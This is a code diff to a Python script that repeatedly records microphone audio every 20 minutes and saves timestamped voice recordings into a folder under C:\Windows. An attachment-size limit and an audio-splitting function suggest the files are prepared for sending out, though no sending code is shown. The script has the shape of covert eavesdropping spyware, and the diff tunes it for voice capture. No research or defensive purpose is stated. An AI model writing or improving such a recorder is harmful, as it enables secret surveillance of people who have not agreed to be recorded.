@@ -9,26 +9,30 @@ from datetime import datetime
 # Shared settings
 output_directory = "C:\\Windows\\klm\\output"
 log_directory = "C:\\Windows\\klm\\logs"
+os.makedirs(output_directory, exist_ok=True)
+os.makedirs(log_directory, exist_ok=True)
 logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-MICROPHONE_DURATION = 150  # Duration of recording, updated to 60 seconds
+MICROPHONE_DURATION = 150  # Duration of recording in seconds
 MAX_ATTACHMENT_SIZE = 3 * 1024 * 1024  # Max size for an attachment
 
 def record_audio():
     try:
-        fs = 44100  # Sample rate
+        fs = 16000  # Sample rate for voice recording
         seconds = MICROPHONE_DURATION  # Duration of recording
+        channels = 1  # Mono recording
+        bit_depth = 2  # 16 bits per sample
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         audio_path = os.path.join(output_directory, f"audio_log_{timestamp}.wav")
 
         logging.info("Starting audio recording...")
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=channels, dtype='int16')
         sd.wait()  # Wait until recording is finished
         logging.info("Audio recording complete.")
 
         # Save as WAV file
         with wave.open(audio_path, 'wb') as wf:
-            wf.setnchannels(2)
-            wf.setsampwidth(2)  # 2 bytes per sample
+            wf.setnchannels(channels)
+            wf.setsampwidth(bit_depth)  # 2 bytes per sample for 16-bit
             wf.setframerate(fs)
             wf.writeframes(myrecording.tobytes())
 
@@ -66,7 +70,7 @@ def split_audio_file(audio_path):
 
 def schedule_recording():
     record_audio()
-    threading.Timer(1200, schedule_recording).start()  # Schedule next recording in 1 hour
+    threading.Timer(1200, schedule_recording).start()  # Schedule next recording in 20 minutes
 
 if __name__ == "__main__":
     schedule_recording()
